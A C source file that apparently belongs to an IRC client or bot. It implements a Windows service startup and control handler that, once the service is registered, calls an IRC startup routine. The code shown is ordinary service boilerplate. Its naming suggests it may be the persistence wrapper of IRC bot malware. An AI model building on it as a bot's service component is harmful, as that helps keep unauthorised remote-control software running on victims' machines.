#include "includes.h"
#include "externs.h"

#ifndef DLL_MODE
SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;

void WINAPI XServiceStartupHandler(DWORD dwArgc,LPTSTR *lpArgv)
{

	#ifdef DEBUG_SYSTEM
	dbg("XServiceStartup(), Started!");
	#endif

	ServiceStatus.dwServiceType             = SERVICE_WIN32;
	ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
	ServiceStatus.dwControlsAccepted        = 0;
	ServiceStatus.dwServiceSpecificExitCode = 0;
	ServiceStatus.dwWin32ExitCode           = 0;
	ServiceStatus.dwCheckPoint              = 0;
	ServiceStatus.dwWaitHint                = 0;

	ServiceStatusHandle = RegisterServiceCtrlHandler(XDefaultServiceName, XServiceControlHandler);
	if (!ServiceStatusHandle)
	{
		#ifdef DEBUG_SYSTEM
		dbg("RegisterServiceCtrlHandler Error!");
		#endif
		return ;
	}

	ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	ServiceStatus.dwCheckPoint   = 0;
	ServiceStatus.dwWaitHint     = 0;
	
	if (!SetServiceStatus(ServiceStatusHandle, &ServiceStatus))
	{
		#ifdef DEBUG_SYSTEM
		dbg("Failed to SetServiceStatus in XServiceStartup!");
		#endif
		return ;
	}

	MainStruct.AsService = TRUE;

	XIRCStartup();

	#ifdef DEBUG_SYSTEM
	dbg("returning... hmm");
	#endif
	return ;
}

void WINAPI XServiceControlHandler(DWORD dwCode)
{
	switch(dwCode)
	{
		case SERVICE_CONTROL_PAUSE:
			ServiceStatus.dwCurrentState = SERVICE_PAUSED;
			break;

		case SERVICE_CONTROL_CONTINUE:
			ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;

		case SERVICE_CONTROL_STOP:
			ServiceStatus.dwCurrentState  = SERVICE_STOPPED;
			ServiceStatus.dwWin32ExitCode = 0;
			ServiceStatus.dwCheckPoint    = 0;
			ServiceStatus.dwWaitHint      = 0;
			if (!SetServiceStatus(ServiceStatusHandle, &ServiceStatus))
			{
				#ifdef DEBUG_SYSTEM
				dbg("SetServiceStatus Switch Error!");
				#endif
			}
			ExitProcess(0);
			return;

		case SERVICE_CONTROL_INTERROGATE:
			break;

		default:
			break;
	}

	if (!SetServiceStatus(ServiceStatusHandle, &ServiceStatus))
	{
		#ifdef DEBUG_SYSTEM
		dbg("SetServiceStatus Switch Error!");
		#endif
	}

	return ;
}
#endif